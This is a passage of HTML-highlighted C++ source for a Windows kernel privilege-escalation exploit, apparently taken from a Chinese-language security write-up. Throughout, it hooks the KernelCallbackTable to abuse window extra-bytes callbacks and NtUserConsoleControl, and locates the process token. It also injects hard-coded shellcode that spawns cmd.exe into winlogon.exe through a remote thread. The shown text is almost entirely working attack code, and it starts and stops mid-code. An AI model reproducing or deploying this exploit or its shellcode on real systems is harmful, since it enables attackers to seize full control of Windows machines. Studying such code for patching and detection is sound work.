punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7B</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7B</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> newAllocFunc<span class="token punctuation">;</span>    <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7B</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7C</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>PDWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7C</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> newFreeFunc<span class="token punctuation">;</span>    <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>KernelCallbackTable <span class="token operator">+</span> <span class="token number">0x7C</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>NTSTATUS WINAPI <span class="token function">ClientFreeWindowsClassExtraBytesProxy</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span> pInfo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    PWND pwnd <span class="token operator">=</span> <span class="token punctuation">(</span>PWND<span class="token punctuation">)</span>pInfo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pwnd<span class="token operator">-&gt;</span>cbWndExtra <span class="token operator">==</span> TRIGGERWND_EXTRASIZE<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gb<span class="token operator">::</span><span class="token function">xxxClientFreeWindowClassExtraBytes</span><span class="token punctuation">(</span>pInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>NTSTATUS WINAPI <span class="token function">ClientAllocatWindowClassExtraBytesProxy</span><span class="token punctuation">(</span>PDWORD size<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>size<span class="token operator">==</span>TRIGGERWND_EXTRASIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//获取窗口句柄</span>        <span class="token comment">//使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] ClientAllocatWindowClassExtraBytesProxy called! Offset = %p\n\n"</span><span class="token punctuation">,</span> gb<span class="token operator">::</span>VictimDeskHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>        gb<span class="token operator">::</span><span class="token function">NtUserConsoleControl</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>gb<span class="token operator">::</span>g_hTriggerWnd<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//修改hWndTriggle 的 tagWnd-&gt;ExtraBytes 为 hTriggerWnd的桌面堆</span>        DWORD64 ulResult <span class="token operator">=</span> gb<span class="token operator">::</span>VictimDeskHeap <span class="token punctuation">;</span>        <span class="token keyword">return</span> gb<span class="token operator">::</span><span class="token function">NtCallbackReturn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ulResult<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> gb<span class="token operator">::</span><span class="token function">xxxClientAllocWindowClassExtraBytes</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>LRESULT __fastcall <span class="token function">WindowProc</span><span class="token punctuation">(</span>HWND a1<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a2 <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">DefWindowProcW</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>bool <span class="token function">CheckPrivilege</span><span class="token punctuation">(</span>HANDLE TokenHandle<span class="token punctuation">)</span><span class="token punctuation">{</span>    BOOL isPrivilegeSet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>    PRIVILEGE_SET       privSet<span class="token punctuation">;</span>    LUID_AND_ATTRIBUTES Privileges<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">LookupPrivilegeValue</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"SeDebugPrivilege"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    privSet<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    privSet<span class="token punctuation">.</span>Control <span class="token operator">=</span> PRIVILEGE_SET_ALL_NECESSARY<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>privSet<span class="token punctuation">.</span>Privilege<span class="token punctuation">,</span> Privileges<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Privileges<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PrivilegeCheck</span><span class="token punctuation">(</span>TokenHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>privSet<span class="token punctuation">,</span> <span class="token operator">&amp;</span>isPrivilegeSet<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> isPrivilegeSet<span class="token punctuation">;</span><span class="token punctuation">}</span>DWORD <span class="token function">getProcessId</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">)</span><span class="token punctuation">{</span>    DWORD aProcesses<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cbNeeded<span class="token punctuation">,</span> cProcesses<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">EnumProcesses</span><span class="token punctuation">(</span>aProcesses<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>aProcesses<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbNeeded<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] EnumProcess failed...\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// Calculate how many process identifiers were returned.</span>    cProcesses <span class="token operator">=</span> cbNeeded <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Print the name and process identifier for each process.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cProcesses<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>aProcesses<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            DWORD processID <span class="token operator">=</span> aProcesses<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            CHAR szProcessName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"&lt;unknown&gt;"</span><span class="token punctuation">;</span>            <span class="token comment">// Get a handle to the process.</span>            HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_INFORMATION <span class="token operator">|</span>                PROCESS_VM_READ<span class="token punctuation">,</span>                FALSE<span class="token punctuation">,</span> processID<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Get the process name.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">!=</span> hProcess<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                HMODULE hMod<span class="token punctuation">;</span>                DWORD cbNeeded<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">EnumProcessModules</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hMod<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>hMod<span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token operator">&amp;</span>cbNeeded<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">GetModuleBaseNameA</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> hMod<span class="token punctuation">,</span> szProcessName<span class="token punctuation">,</span>                        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>szProcessName<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TCHAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment">// Print the process name and identifier.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">lstrcmpA</span><span class="token punctuation">(</span>szProcessName<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>processID<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">// Release the handle to the process.</span>            <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">SpawnShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    HANDLE hSystemProcess <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span>    PVOID  pLibRemote<span class="token punctuation">;</span>    HMODULE hKernel32 <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD processID<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>        <span class="token string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51"</span> \        <span class="token string">"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"</span> \        <span class="token string">"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"</span> \        <span class="token string">"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed"</span> \        <span class="token string">"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88"</span> \        <span class="token string">"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"</span> \        <span class="token string">"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"</span> \        <span class="token string">"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"</span> \        <span class="token string">"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"</span> \        <span class="token string">"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"</span> \        <span class="token string">"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"</span> \        <span class="token string">"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"</span> \        <span class="token string">"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"</span> \        <span class="token string">"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"</span> \        <span class="token string">"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"</span> \        <span class="token string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"</span> \        <span class="token string">"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65"</span> \        <span class="token string">"\x78\x65\x00"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>processID <span class="token operator">=</span> <span class="token function">getProcessId</span><span class="token punctuation">(</span><span class="token string">"winlogon.exe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] Couldn't retrieve process ID...\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Retrieved process id: %d\n"</span><span class="token punctuation">,</span> processID<span class="token punctuation">)</span><span class="token punctuation">;</span>    hSystemProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>GENERIC_ALL<span class="token punctuation">,</span> false<span class="token punctuation">,</span> processID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hSystemProcess <span class="token operator">==</span> INVALID_HANDLE_VALUE <span class="token operator">||</span> hSystemProcess <span class="token operator">==</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] Couldn't open system process...\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Got a handle on a system Process: %08p\n"</span><span class="token punctuation">,</span> hSystemProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>    pLibRemote <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hSystemProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pLibRemote<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] Virtual alloc failed !\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Allocation in system process succeded with address %08p\n"</span><span class="token punctuation">,</span> pLibRemote<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hSystemProcess<span class="token punctuation">,</span> pLibRemote<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] WriteProcessMemory failed !\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hSystemProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pLibRemote<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Writing in system process succeded\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] CreateRemoteThread failed !\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Remote thread created !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hSystemProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ULONG64 <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    ULONG64 Token <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ULONG len <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    NTSTATUS ntst <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">OpenProcessToken</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GENERIC_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>gb<span class="token operator">::</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>gb<span class="token operator">::</span>hToken <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] GetToken(): OpenProcessToken failed.\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//获取本进程的EPROCESS</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        len <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>        sys_handle_info_ref <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_HANDLE_INFORMATION_EX<span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>sys_handle_info_ref<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        ntst <span class="token operator">=</span> gb<span class="token operator">::</span><span class="token function">ZwQuerySystemInformation</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>SYSTEM_INFORMATION_CLASS<span class="token punctuation">)</span>SystemExtendedHandleInformation<span class="token punctuation">,</span> sys_handle_info_ref<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ntst <span class="token operator">==</span> STATUS_INFO_LENGTH_MISMATCH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ntst <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sys_handle_info_ref<span class="token punctuation">)</span>            <span class="token function">free</span><span class="token punctuation">(</span>sys_handle_info_ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    DWORD pid <span class="token operator">=</span> <span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sys_handle_info_ref<span class="token operator">-&gt;</span>HandleCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gb<span class="token operator">::</span>hToken <span class="token operator">==</span> sys_handle_info_ref<span class="token operator">-&gt;</span>Handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>HandleValue            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span>pid <span class="token operator">==</span> sys_handle_info_ref<span class="token operator">-&gt;</span>Handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>UniqueProcessId<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Token <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG64<span class="token punctuation">)</span>sys_handle_info_ref<span class="token operator">-&gt;</span>Handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sys_handle_info_ref<span class="token punctuation">)</span>        <span class="token function">free</span><span class="token punctuation">(</span>sys_handle_info_ref<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Found current process token = %p\n"</span><span class="token punctuation">,</span> Token<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Token<span class="token punctuation">;</span><span class="token punctuation">}</span>BOOLEAN <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    BOOLEAN bRet <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD64 next_code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    __try <span class="token punctuation">{</span>        gb<span class="token operator">::</span>g_hUser32 <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>gb<span class="token operator">::</span>g_hUser32<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %d, Code = 0x%p"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//获取u32_IsMenu</span>        gb<span class="token operator">::</span>u32_IsMenu <span class="token operator">=</span> <span class="token punctuation">(</span>IsMenu_t<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>gb<span class="token operator">::</span>g_hUser32<span class="token punctuation">,</span> <span class="token string">"IsMenu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>gb<span class="token operator">::</span>u32_IsMenu<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %d, Code = 0x%p"</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token 